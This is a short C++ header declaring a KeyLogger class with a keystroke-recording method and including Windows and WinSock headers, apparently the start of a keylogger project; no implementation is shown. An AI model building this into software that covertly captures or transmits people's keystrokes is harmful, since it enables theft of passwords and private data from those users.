#pragma once

#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <thread>


class KeyLogger
{
public:
	KeyLogger();
	~KeyLogger();

	void RecordKeyboardClicks();

private:

};
